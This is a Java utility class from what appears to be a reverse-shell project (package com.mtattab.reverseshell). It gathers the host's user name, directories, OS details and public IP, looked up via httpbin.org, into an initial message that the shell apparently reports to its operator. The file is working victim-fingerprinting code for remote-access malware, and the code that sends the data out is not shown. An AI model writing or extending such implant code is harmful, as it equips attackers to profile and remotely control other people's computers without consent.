package com.mtattab.reverseshell.util;

import com.mtattab.reverseshell.model.InitialConnectionMessageModel;
import com.mtattab.reverseshell.model.PublicIpJsonModel;
import com.mtattab.reverseshell.model.ReverseShellInfoInitialMessage;
import lombok.experimental.UtilityClass;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

@UtilityClass
public class OSUtil {
    public static ReverseShellInfoInitialMessage getComputerInfo() {

        return ReverseShellInfoInitialMessage.builder()
                .userName(System.getProperty("user.name"))
                .userLanguage(System.getProperty("user.language"))
                .userCurrentWorkingDir(System.getProperty("user.dir"))
                .userHome(System.getProperty("user.home"))
                .osName(System.getProperty("os.name"))
                .osArch(System.getProperty("os.arch"))
                .osVersion(System.getProperty("os.version"))
                .userPublicIp(getPublicIp())
                .build();

    }

    public static String getSystemTmpDir(){

        return System.getProperty("java.io.tmpdir");
    }

    private static String getPublicIp() {
        try {
            URL url = new URL("https://httpbin.org/ip");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }

                // The response is a JSON object containing the public IP address
                // You may need to parse this JSON response depending on your needs
                // In this example, we assume a simple JSON format like {"origin": "xxx.xxx.xxx.xxx"}
                String json = response.toString();

                PublicIpJsonModel publicIpJsonModel = DataManipulationUtil.jsonToObject(
                        json, PublicIpJsonModel.class);

                if (publicIpJsonModel!= null && publicIpJsonModel.getOrigin() !=null){
                    connection.disconnect();

                    return publicIpJsonModel.getOrigin();
                }else {
                    connection.disconnect();

                    return response.toString();
                }

            } finally {
                connection.disconnect();
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }




}
